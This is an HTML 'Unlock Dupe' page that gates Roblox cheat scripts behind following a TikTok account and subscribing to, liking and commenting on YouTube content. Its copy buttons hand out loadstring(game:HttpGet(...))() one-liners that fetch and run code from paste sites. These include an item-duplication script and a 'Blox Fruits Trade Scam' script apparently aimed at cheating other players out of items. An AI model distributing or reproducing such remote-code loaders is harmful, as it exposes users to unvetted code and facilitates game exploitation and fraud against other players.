<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Unlock Dupe</title>

<style>
body {
  margin: 0;
  height: 100vh;
  background: linear-gradient(180deg,#0b1220,#050814);
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #fff;
}

.card {
  width: 90%;
  max-width: 380px;
  background: #111a2e;
  border-radius: 16px;
  padding: 22px;
  box-shadow: 0 20px 40px rgba(0,0,0,.6);
  display: flex;
  flex-direction: column;
}

.title {
  text-align: center;
  font-size: 24px;
  font-weight: bold;
  color: #4fd1ff;
}

.subtitle {
  text-align: center;
  font-size: 14px;
  opacity: .85;
  margin: 8px 0 18px;
}

.tasks-container {
  flex-grow: 1;
}

.task {
  width: 100%;
  border: none;
  padding: 14px;
  margin: 7px 0;
  border-radius: 10px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  color: #fff;
}

.tiktok { background:#3b82f6; }
.youtube { background:#f59e0b; }
.like { background:#22c55e; }
.comment { background:#ec4899; }
.watch { background:#ef4444; }
.trade { background:#d97706; }

.progress {
  background: #1e293b;
  border-radius: 10px;
  height: 12px;
  margin-top: 16px;
  overflow: hidden;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg,#4fd1ff,#38bdf8);
  transition: width .3s;
}

.percent {
  text-align: center;
  font-size: 13px;
  margin-top: 6px;
}

.scripts {
  display: none;
  margin-top: 20px;
}

.script-box {
  background: #0b1220;
  border-radius: 12px;
  padding: 14px;
  margin-bottom: 12px;
}

.script-title {
  font-weight: bold;
  margin-bottom: 8px;
}

.copy {
  width: 100%;
  border: none;
  padding: 10px;
  border-radius: 8px;
  background: #4fd1ff;
  color: #000;
  font-weight: bold;
  cursor: pointer;
}

/* Bottom button */
.bottom-button {
  margin-top: 20px;
  background: #ff5722;
  padding: 12px;
  font-weight: bold;
  border-radius: 12px;
  border: none;
  cursor: pointer;
  color: white;
  font-size: 16px;
  user-select: none;
  transition: background 0.3s;
}

.bottom-button:hover {
  background: #e64a19;
}
</style>
</head>

<body>

<div class="card" id="card">

  <div class="title" id="title">🔑 Unlock Dupe</div>
  <div class="subtitle" id="subtitle">Complete all steps to unlock</div>

  <div class="tasks-container" id="tasks">

    <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
    <button class="task youtube" onclick="step(this,'https://youtube.com/@xxxvoid_scriptzxxx?si=SCGX78XJf16UEyoq')">🔔 Subscribe YouTube</button>
    <button class="task like" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">👍 Like Video</button>
    <button class="task comment" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">💬 Comment on Video</button>
    <button class="task watch" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">▶️ Watch Video</button>

  </div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>
  <div class="percent" id="percent">0%</div>

  <!-- Scripts -->
  <div class="scripts" id="scripts">

    <div class="script-box">
      <div class="script-title">Script 1</div>
      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://dpaste.com/ELB5KB66F.txt&quot;, true))()`)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Script 2</div>
      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://pastefy.app/qLQ25me5/raw&quot;))()`)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Script 3</div>
      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://pastefy.app/cX73Mb9d/raw&quot;))()`)">Copy</button>
    </div>

  </div>

  <button class="bottom-button" id="tradeScamBtn" onclick="showTradeScam()">Blox Fruits Trade Scam</button>

</div>

<script>
let done = 0;
const total = 5;

function step(btn, link) {
  if (btn.dataset.done) return;
  btn.dataset.done = true;
  btn.style.opacity = .6;
  done++;
  update();
  window.open(link, "_blank");
}

function update() {
  let percent = Math.floor((done / total) * 100);
  document.getElementById("bar").style.width = percent + "%";
  document.getElementById("percent").innerText = percent + "%";

  if (percent === 100) {
    document.getElementById("scripts").style.display = "block";
  }
}

function copy(text) {
  navigator.clipboard.writeText(text);
  alert("Copied!");
}

function resetProgress() {
  done = 0;
  document.getElementById("bar").style.width = "0%";
  document.getElementById("percent").innerText = "0%";
  document.getElementById("scripts").style.display = "none";
}

// Store the original HTML for the tasks and scripts so we can revert easily
const originalTasksHTML = `
  <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
  <button class="task youtube" onclick="step(this,'https://youtube.com/@xxxvoid_scriptzxxx?si=SCGX78XJf16UEyoq')">🔔 Subscribe YouTube</button>
  <button class="task like" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">👍 Like Video</button>
  <button class="task comment" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">💬 Comment on Video</button>
  <button class="task watch" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">▶️ Watch Video</button>
`;

const originalScriptsHTML = `
    <div class="script-box">
      <div class="script-title">Script 1</div>
      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://dpaste.com/ELB5KB66F.txt&quot;, true))()\`)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Script 2</div>
      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://pastefy.app/qLQ25me5/raw&quot;))()\`)">Copy</button>
    </div>

    <div class="script-box">
      <div class="script-title">Script 3</div>
      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://pastefy.app/cX73Mb9d/raw&quot;))()\`)">Copy</button>
    </div>
`;

function showTradeScam() {
  // Change title and subtitle
  document.getElementById("title").innerText = "⚠️ Blox Fruits Trade Scam";
  document.getElementById("subtitle").innerText = "Complete all steps to unlock";

  // Replace tasks with the modified ones:
  // TikTok stays same
  // Replace YouTube video related buttons with the same link https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M
  document.getElementById("tasks").innerHTML = `
    <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
    <button class="task youtube" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">🔔 Subscribe YouTube</button>
    <button class="task like" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">👍 Like Video</button>
    <button class="task comment" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">💬 Comment on Video</button>
    <button class="task watch" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">▶️ Watch Video</button>
  `;

  // Replace scripts area with the new script only
  document.getElementById("scripts").innerHTML = `
    <div class="script-box">
      <div class="script-title">Trade Scam Script</div>
      <button class="copy" onclick="copy('loadstring(game:HttpGet(\\'https://api.rubis.app/v2/scrap/fRNF9vgOh5toji9n/raw\\', true))()')">Copy</button>
    </div>
  `;

  // Reset progress
  resetProgress();
}

</script>

</body>
</html>
